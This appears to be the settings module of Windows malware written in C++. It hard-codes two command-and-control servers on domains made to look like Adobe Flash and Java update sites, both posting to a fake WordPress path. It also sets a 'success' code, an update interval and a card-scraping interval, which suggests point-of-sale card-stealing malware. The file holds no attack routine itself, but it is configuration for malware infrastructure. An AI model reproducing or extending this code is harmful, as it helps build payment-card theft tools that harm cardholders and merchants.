#include "Settings.h"
#include "Base.h"

Settings::Settings()
{
	InitializeCriticalSection(&s);

	cnc.push_back(std::pair<std::string, std::string>("adobeflasherup1.com", "/wordpress/post.php"));
	cnc.push_back(std::pair<std::string, std::string>("javaoracle2.ru", "/wordpress/post.php"));

	successcode = 666;
	updateinterval = 240;
	cardinterval = 120;

	log = true;
}

Settings *Settings::instance()
{
	static Settings *i = NULL;
	if (!i)
		i = new Settings();

	return(i);
}

Settings::~Settings(void)
{
	DeleteCriticalSection(&s);
}

void Settings::lock()
{
	EnterCriticalSection(&s);
}

void Settings::unlock()
{
	LeaveCriticalSection(&s);
}

void Settings::setUpdateInterval(unsigned int i)
{
	if (i < 10)
		i = 10;
	lock();
	updateinterval = i;
	unlock();
}

void Settings::setCardInterval(unsigned int i)
{
	if (i < 10)
		i = 10;
	lock();
	cardinterval = i;
	unlock();
}

void Settings::setLogging(bool log)
{
	lock();
	this->log = log;
	unlock();
}
